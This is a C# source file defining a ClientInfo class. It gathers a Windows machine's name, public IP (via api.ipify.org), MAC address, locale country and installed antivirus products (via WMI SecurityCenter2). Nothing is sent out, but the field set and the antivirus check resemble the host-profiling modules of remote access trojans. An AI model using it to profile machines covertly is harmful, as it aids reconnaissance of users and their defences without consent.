using System;
using System.Globalization;
using System.Linq;
using System.Management;
using System.Net;
using System.Net.NetworkInformation;
using System.Net.Http;

public class ClientInfo
{
    public string PcName { get; init; } = "";
    public string Ip { get; init; } = "";
    public string Mac { get; init; } = "";
    public string Antivirus { get; init; } = "";
    public string Country { get; init; } = "";

    public static ClientInfo Collect()
    {
        return new ClientInfo
        {
            PcName = Environment.MachineName,
            Ip = GetLocalIPv4() ?? "N/A",
            Mac = GetMacAddress() ?? "N/A",
            Antivirus = GetAntivirusName() ?? "N/A",
            Country = GetCountry() ?? "N/A"
        };
    }

private static string? GetLocalIPv4()
{
    // 1) tenta IP público
    try
    {
        using var http = new HttpClient();
        http.Timeout = TimeSpan.FromSeconds(3);
        var ip = http.GetStringAsync("https://api.ipify.org").Result.Trim();

        if (!string.IsNullOrWhiteSpace(ip))
            return ip;
    }
    catch
    {
        // ignora, cai no fallback
    }

    // 2) fallback: IP da rede local
    try
    {
        return Dns.GetHostEntry(Dns.GetHostName())
                  .AddressList
                  .FirstOrDefault(a => a.AddressFamily == System.Net.Sockets.AddressFamily.InterNetwork)?
                  .ToString();
    }
    catch
    {
        return null;
    }
}

private static string? GetMacAddress()
{
    try
    {
        var nics = NetworkInterface.GetAllNetworkInterfaces()
            .Where(n =>
                n.OperationalStatus == OperationalStatus.Up &&
                n.NetworkInterfaceType != NetworkInterfaceType.Loopback)
            .ToArray();

        foreach (var nic in nics)
        {
            var bytes = nic.GetPhysicalAddress().GetAddressBytes();
            if (bytes.Length == 0) continue;

            var mac = string.Join(":", bytes.Select(b => b.ToString("X2")));
            if (!string.IsNullOrWhiteSpace(mac) && mac != "00:00:00:00:00:00")
                return mac;
        }

        return null;
    }
    catch
    {
        return null;
    }
}


private static string? GetCountry()
{
    try
    {
        var culture = CultureInfo.CurrentUICulture;
        var region = new RegionInfo(culture.LCID);
        return region.EnglishName; // ou NativeName se quiser PT
    }
    catch
    {
        return null;
    }
}


    private static string? GetAntivirusName()
    {
        try
        {
            // Funciona no Windows 10+ para SecurityCenter2
            using var searcher = new ManagementObjectSearcher(
                @"root\SecurityCenter2", "SELECT * FROM AntiVirusProduct");

            var names = searcher.Get()
                .Cast<ManagementObject>()
                .Select(mo => mo["displayName"]?.ToString())
                .Where(n => !string.IsNullOrWhiteSpace(n))
                .Distinct()
                .ToArray();

            return names.Length == 0 ? null : string.Join(", ", names);
        }
        catch
        {
            return null;
        }
    }
}
